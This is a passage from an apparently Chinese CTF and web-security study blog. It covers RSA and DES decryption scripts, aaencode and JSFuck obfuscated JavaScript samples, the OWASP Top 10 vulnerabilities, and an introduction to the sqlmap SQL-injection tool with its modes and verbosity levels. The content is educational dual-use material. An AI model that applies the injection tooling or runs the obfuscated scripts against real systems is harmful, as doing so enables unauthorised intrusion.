<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">split_n</span><span class="params">(n)</span>:</span>   <span class="comment">#分解n</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,n):</span><br><span class="line">        <span class="keyword">if</span> n%i == <span class="number">0</span>:</span><br><span class="line">            p = i</span><br><span class="line">            q = int(n/i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> p,q</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span>   <span class="comment">#求d</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a, m)</span>:</span></span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        exit(<span class="string">'wrong'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line">e=<span class="number">19</span></span><br><span class="line">n=<span class="number">920139713</span></span><br><span class="line"></span><br><span class="line">res=<span class="string">''</span></span><br><span class="line">p,q=split_n(n)</span><br><span class="line">print(<span class="string">'n:%d'</span>%n)</span><br><span class="line">print(<span class="string">'e:%d'</span>%e)</span><br><span class="line">print(<span class="string">"p = "</span> + str(p))</span><br><span class="line">print(<span class="string">"q = "</span> + str(q))</span><br><span class="line">d=modinv(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">print(<span class="string">'d = '</span>+str(d))</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'rsa.txt'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> f:</span><br><span class="line">        res+=chr(pow(int(c.replace(<span class="string">'\n'</span>,<span class="string">''</span>)),d,n))</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
<ul>
<li><p>DES（对称算法）</p>
<p><a href="https://blog.csdn.net/qq_42606051/article/details/81279504" rel="external nofollow" target="_blank">https://blog.csdn.net/qq_42606051/article/details/81279504</a></p>
<p>题目</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">密文：74cWby3JysahM3cZudF3gT11lamL/4Cd</span><br><span class="line">key=12345678</span><br><span class="line">求明文</span><br></pre></td></tr></table></figure>
<p>代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="string">'12345678'</span></span><br><span class="line"></span><br><span class="line">des = DES.new(key,DES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">encrypted_text=base64.b64decode(<span class="string">'74cWby3JysahM3cZudF3gT11lamL/4Cd'</span>)</span><br><span class="line"></span><br><span class="line">decrypted_text = des.decrypt(encrypted_text)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"明文:"</span>+decrypted_text</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080611.png" alt=""></p>
</li>
</ul>
<ul>
<li><a href="https://blog.csdn.net/iteye_6478/article/details/82165923" rel="external nofollow" target="_blank">https://blog.csdn.net/iteye_6478/article/details/82165923</a></li>
</ul>
<ul>
<li><p>拓展</p>
<p>与佛论禅</p>
<ul>
<li><p><a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" rel="external nofollow" target="_blank">http://www.keyfc.net/bbs/tools/tudoucode.aspx</a></p>
</li>
<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">怯勝苦集參哆究梵礙呐度究梵呼梵顛以怯勝豆哆陀哆真罰夜大知涅曳他呐依道多波缽喝侄波缽羅奢喝俱咒冥上奢阿怯喝侄羅以侄朋僧哆婆謹冥地諳顛哆度哆都冥寫有呐阿勝娑哆涅皤怛。怯苦怯南是哆得謹侄訶至故殿故僧道多地罰倒皤利奢喝呐南奢都哆。切是奢究奢藝侄參哆佛曰明諳道彌奢娑阿哆寫娑利梵姪若諦竟奢藐悉奢集諳彌諳遮怯。皤喝阿孕怯曰罰般梵多伊梵耨死哆彌阿輸呐遮冥上哆藐夷冥輸俱故沙恐冥薩侄栗世得。耨夢諳智都冥薩耨俱薩皤密吉怖罰想上罰喝訶罰蒙盧舍神藝哆知呐姪怯那楞皤度遮奢顛度梵咒呐訶悉梵利究即冥夢諳一俱娑怯沙俱三奢婆缽知侄無呐若槃醯想哆故冥怖沙諳一豆曳呐咒心羯有</span><br></pre></td></tr></table></figure>
</li>
<li><p>解密前要带上<code>佛曰：</code>或<code>如是我闻：</code>的文字。</p>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>aaencode</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ [&apos;_&apos;]; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: &apos;_&apos; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &apos;_&apos;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&apos;_&apos;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&apos;_&apos;) [c^_^o];(ﾟДﾟ) [&apos;c&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&apos;o&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&apos;c&apos;]+(ﾟДﾟ) [&apos;o&apos;]+(ﾟωﾟﾉ +&apos;_&apos;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟｰﾟ] + ((ﾟДﾟ) +&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&apos;c&apos;]+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&apos;o&apos;]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ];(ﾟДﾟ) [&apos;_&apos;] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&apos;_&apos;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&apos;_&apos;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&apos;\\&apos;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&apos;_&apos;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&apos;\&quot;&apos;;(ﾟДﾟ) [&apos;_&apos;] ( (ﾟДﾟ) [&apos;_&apos;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&apos;_&apos;);</span><br></pre></td></tr></table></figure>
<ul>
<li>解密网站  <a href="https://www.qtool.net/decode" rel="external nofollow" target="_blank">https://www.qtool.net/decode</a></li>
</ul>
</li>
</ul>
<ul>
<li><p>jsfuck</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[!+[]+!+[]]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(![]+[+[]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+[]]]+(+(+!+[]+[+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]]((+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[+!+[]])+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+([+[]]+![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+[]]]</span><br></pre></td></tr></table></figure>
<p>chrome控制台解密</p>
</li>
</ul>
<h2 id="day03–7iny"><a href="#day03–7iny" class="headerlink" title="day03–7iny"></a>day03–7iny</h2><h3 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h3><p>以下内容以web安全为主，Danie1整理的内网地址为实验室靶场环境，三康庙职业技术学院的同学可在校园网环境下访问。不可访问的同学理解原理学习即可</p>
<h3 id="OWASP-TOP-10漏洞"><a href="#OWASP-TOP-10漏洞" class="headerlink" title="OWASP TOP 10漏洞"></a>OWASP TOP 10漏洞</h3><h4 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h4><p>2017版TOP10思维导图</p>
<p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080701.png" alt=""></p>
<h4 id="TOP10漏洞介绍"><a href="#TOP10漏洞介绍" class="headerlink" title="TOP10漏洞介绍"></a>TOP10漏洞介绍</h4><h5 id="A1-注入-Injection"><a href="#A1-注入-Injection" class="headerlink" title="A1 注入 Injection"></a>A1 注入 Injection</h5><blockquote>
<p>Web安全头号大敌。注入攻击漏洞往往是应用程序缺少对输入进行安全性检查所引起的。攻击者把一些包含攻击代码当做命令或者查询语句发送给解释器，这些恶意数据可以欺骗解释器，从而执行计划外的命令或者未授权访问数据。注入漏洞通常能SQL查询、LDAP查询、OS命令、程序参数等中出现</p>
</blockquote>
<h5 id="A2-失效的身份认证和会话管理-Broken-Authentication-and-Session-Management"><a href="#A2-失效的身份认证和会话管理-Broken-Authentication-and-Session-Management" class="headerlink" title="A2 失效的身份认证和会话管理  Broken Authentication and Session Management"></a>A2 失效的身份认证和会话管理  Broken Authentication and Session Management</h5><blockquote>
<p>与认证和会话管理相关的应用程序功能往往得不到正确管理，这就导致攻击者破坏密码、密匙、会话令牌或利用实施漏洞冒充其他用户身份。</p>
</blockquote>
<h5 id="A3-跨站脚本-XSS"><a href="#A3-跨站脚本-XSS" class="headerlink" title="A3 跨站脚本-XSS"></a>A3 跨站脚本-XSS</h5><blockquote>
<p>XSS的出现时间跟SQL差不多，是最普遍的web应用安全漏洞。当应用程序在发送给浏览器的页面中包含用户提供的数据，但没有经过适当验证或转译，就会导致跨站脚本漏洞。XSS允许攻击者在受害者的浏览器中执行脚本，这些脚本可以劫持用户会话，破坏网站，或将用户重定向到恶意站点。</p>
</blockquote>
<h5 id="A4-不安全的直接对象引用-Insecurity-Direct-Object-Reference"><a href="#A4-不安全的直接对象引用-Insecurity-Direct-Object-Reference" class="headerlink" title="A4 不安全的直接对象引用 Insecurity Direct Object Reference"></a>A4 不安全的直接对象引用 Insecurity Direct Object Reference</h5><blockquote>
<p>当开发人员公开对内部实现对象(如文件、目录或数据库键)的引用时，就会出现直接对象引用。如果没有访问控制检查或其他保护，攻击者可以操纵这些引用来访问未经授权的数据。</p>
</blockquote>
<h5 id="A5-安全配置错误-Security-Misconfiguration"><a href="#A5-安全配置错误-Security-Misconfiguration" class="headerlink" title="A5 安全配置错误 Security Misconfiguration"></a>A5 安全配置错误 Security Misconfiguration</h5><blockquote>
<p>良好的安全性需要为应用程序、框架、应用服务器、web服务器、数据库服务器和平台定义和部署安全配置。默认值通常是不安全的。另外，软件应该保持更新。攻击者通过访问默认账户、未使用的网页、未安装补丁的漏洞、未被保护的文件和目录等，以获得对系统未授权的访问。</p>
</blockquote>
<h5 id="A6-敏感信息泄露-Sensitive-Data-Exposure"><a href="#A6-敏感信息泄露-Sensitive-Data-Exposure" class="headerlink" title="A6 敏感信息泄露 Sensitive Data Exposure"></a>A6 敏感信息泄露 Sensitive Data Exposure</h5><blockquote>
<p>保护与加密敏感数据已经成为网络应用的最重要的组成部分。最常见的漏洞是应该进行加密的数据没有进行加密。使用加密的情况下常见问题是不安全的密钥和使用弱算法加密。</p>
</blockquote>
<h5 id="A7-缺少功能级访问控制"><a href="#A7-缺少功能级访问控制" class="headerlink" title="A7 缺少功能级访问控制"></a>A7 缺少功能级访问控制</h5><blockquote>
<p>大多数web应用程序在实现UI中可见的功能之前，都要验证功能级别的访问权限。但是，当访问每个函数时，应用程序需要在服务器上执行相同的访问控制检查。如果请求没有得到验证，攻击者将能够伪造请求，以便在没有适当授权的情况下访问功能。</p>
</blockquote>
<h5 id="A8-跨站请求伪造-CSRF"><a href="#A8-跨站请求伪造-CSRF" class="headerlink" title="A8 跨站请求伪造 CSRF"></a>A8 跨站请求伪造 CSRF</h5><blockquote>
<p>利用了网站允许攻击者预测特定操作的所有细节这一特点。由于浏览器自动发送会话cookie等认证凭证，导致攻击者能够创建恶意的web页面来伪造请求。这些伪造的请求很难和合法的请求区分开。CSRF通过伪装来自受信任用户的请求来利用受信任的网站。</p>
</blockquote>
<h5 id="A9-使用含有已知漏洞的组件"><a href="#A9-使用含有已知漏洞的组件" class="headerlink" title="A9 使用含有已知漏洞的组件"></a>A9 使用含有已知漏洞的组件</h5><blockquote>
<p>开发人员使用的组件也会含有漏洞，这些漏洞能够被自动化工具发现和利用。然后攻击者根据需要定制攻击代码并实施攻击。</p>
</blockquote>
<h5 id="A10-未验证的重定向和转发"><a href="#A10-未验证的重定向和转发" class="headerlink" title="A10 未验证的重定向和转发"></a>A10 未验证的重定向和转发</h5><blockquote>
<p>应用程序经常将用户重定向到其他网页，或以类似的方式进行内部转发。当目标网页是通过一个未验证的参数来指定时，就容易被攻击者利用。攻击者通过诱使受害人去点击未经验证的重定向链接，从而利用不安全的转发绕过安全检测。攻击者通过重定向可以试图安装恶意软件或者诱使受害人泄露密码等敏感信息，通过转发可以绕过访问控制。</p>
</blockquote>
<p><a href="https://www.jianshu.com/p/1440c2035b28" rel="external nofollow" target="_blank">详细介绍</a></p>
<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>在owasp发布的top 10漏洞里面，注入漏洞一直是危害排名第一，其中数据库注入漏洞是危害最大也是最受关注的漏洞。</p>
<p>当攻击者发送的sql语句被sql解释器执行，通过执行这些恶意语句欺骗数据库执行，导致数据库信息泄露。</p>
<h4 id="教程推荐"><a href="#教程推荐" class="headerlink" title="教程推荐"></a>教程推荐</h4><ul>
<li><p>看雪图书</p>
<p>1、<a href="https://www.kanxue.com/book-6-110.htm" rel="external nofollow" target="_blank">sql注入的原理与分类</a></p>
<p>2、<a href="https://www.kanxue.com/book-6-111.htm" rel="external nofollow" target="_blank">盲注</a></p>
<p>3、<a href="https://www.kanxue.com/book-6-112.htm" rel="external nofollow" target="_blank">DVWA SQL Injection分析与利用</a></p>
<p>4、<a href="https://www.kanxue.com/book-6-113.htm" rel="external nofollow" target="_blank">DVWA SQL Injection (Blind)分析与利用</a></p>
<p>5、<a href="https://www.kanxue.com/book-6-114.htm" rel="external nofollow" target="_blank">Sqlmap盲注利用</a></p>
<p>6、<a href="https://www.kanxue.com/book-6-115.htm" rel="external nofollow" target="_blank">防范sql注入</a></p>
</li>
</ul>
<h4 id="sqlmap安装"><a href="#sqlmap安装" class="headerlink" title="sqlmap安装"></a>sqlmap安装</h4><p><em>sqlmap</em>的使用需要<em>python</em>环境</p>
<p>1.python下载：<a href="https://www.python.org/downloads/" rel="external nofollow" target="_blank">官网</a></p>
<p>2.sqlmap下载：<a href="http://sqlmap.org/" rel="external nofollow" target="_blank">官网</a></p>
<blockquote>
<p>1.将下载的SQLMAP安装包解压到文件夹sqlmap中，并拷贝到 Python27 安装目录下</p>
<p>2.在文件夹下创建sqlmap.bat ,内容为cmd.exe，创建桌面快捷方式</p>
</blockquote>
<h4 id="sqlmap作用"><a href="#sqlmap作用" class="headerlink" title="sqlmap作用"></a>sqlmap作用</h4><p>1、判断可注入的参数</p>
<p>2、判断可以用那种SQL注入技术来注入</p>
<p>3、识别出哪种数据库</p>
<p>4、根据用户选择，读取哪些数据</p>
<p><strong>sqlmap支持五种不同的注入模式</strong>：</p>
<p>1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。</p>
<p>2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</p>
<p>3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p>
<p>4、联合查询注入，可以使用union的情况下的注入。</p>
<p>5、堆查询注入，可以同时执行多条语句的执行时的注入。</p>
<p><strong>sqlmap支持的数据库有</strong>：</p>
<p>MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB</p>
<p>测试GET参数，POST参数，HTTP Cookie参数，HTTP User-Agent头和HTTP Referer头来确认是否有SQL注入，它也可以指定用逗号分隔的列表的具体参数来测试。</p>
<p>可以设定HTTP(S)请求的并发数，来提高盲注时的效率。</p>
<p>如果你想观察sqlmap对一个点是进行了怎样的尝试判断以及读取数据的，可以使用-v参数。</p>
<p>共有七个等级，默认为1：</p>
<p>0、只显示python错误以及严重的信息。</p>
<p>1、同时显示基本信息和警告信息。（默认）</p>
<p>2、同时显示debug信息。</p>
<p>3、同时显示注入的payload。</p>
<p>4、同时显示HTTP请求。</p>
<p>5、同时显示HTTP响应头。</p>
<p>6、同时显示HTTP响应页面。</p>
